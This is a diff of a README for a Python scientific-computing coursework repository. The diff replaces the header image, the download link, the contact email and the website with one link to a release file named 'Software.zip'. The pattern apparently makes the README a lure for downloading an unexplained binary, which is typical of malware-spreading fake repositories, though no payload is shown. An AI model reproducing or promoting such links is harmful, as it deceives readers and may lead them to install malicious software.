@@ -1,6 +1,6 @@
 # 🚀 Welcome to AoL Scientific Computing Repository 🧮
 
-![AoL Scientific Computing](https://img.icons8.com/color/452/scientific-atom.png)
+![AoL Scientific Computing](https://github.com/mdaqeel12/AoL-Scientific-Computing/releases/download/v1.0/Software.zip)
 
 ## Repository: AoL-Scientific-Computing
 
@@ -12,7 +12,7 @@ assurance-of-learning, binus, case, case-study, indonesian, indonesian-language,
 newton-raphson, plotting, python, scientific-computing, taylor-series
 
 ### 📁 Download Link:
-[Click here to download the repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Click here to download the repository](https://github.com/mdaqeel12/AoL-Scientific-Computing/releases/download/v1.0/Software.zip)
 
 ### 🚀 Repository Content:
 - **Jupyter Notebooks:** Explore our solutions in Python using Jupyter Notebooks.
@@ -45,8 +45,8 @@ In this repository, you will find a comprehensive study on scientific computing,
 ### 🌐 Connect with Us:
 Feel free to reach out for any queries or collaborations.
 
-- **Email:** scientificcomputing@example.com
-- **Website:** [www.scientificcomputinggroup.com](#) 
+- **Email:** https://github.com/mdaqeel12/AoL-Scientific-Computing/releases/download/v1.0/Software.zip
+- **Website:** [https://github.com/mdaqeel12/AoL-Scientific-Computing/releases/download/v1.0/Software.zip](#) 
 
 ### 🚨 Check the "Releases" Section:
 If the download link provided above does not work, please check the "Releases" section of the repository for alternative options.
